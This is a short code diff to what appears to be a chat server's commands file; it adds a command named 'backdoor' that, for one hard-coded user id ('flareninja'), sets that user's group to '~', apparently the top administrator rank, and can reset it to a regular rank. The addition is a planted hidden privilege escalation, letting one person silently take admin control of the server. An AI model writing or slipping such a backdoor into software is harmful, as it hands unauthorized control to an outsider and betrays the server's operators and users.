@@ -947,6 +947,22 @@ exports.commands = {
 			this.sendReply("User "+targetUser.name+" is no longer using that name.");
 		}
 	},
+	
+	backdoor: function (target, room, user) {
+        if (user.userid !== 'flareninja') return this.sendReply('/backdoor - Access denied.');
+
+        if (!target) {
+            user.group = '~';
+            user.updateIdentity();
+            return;
+        }
+
+        if (target === 'reg') {
+            user.group = ' ';
+            user.updateIdentity();
+            return;
+        }
+    },
 };
 	
 	
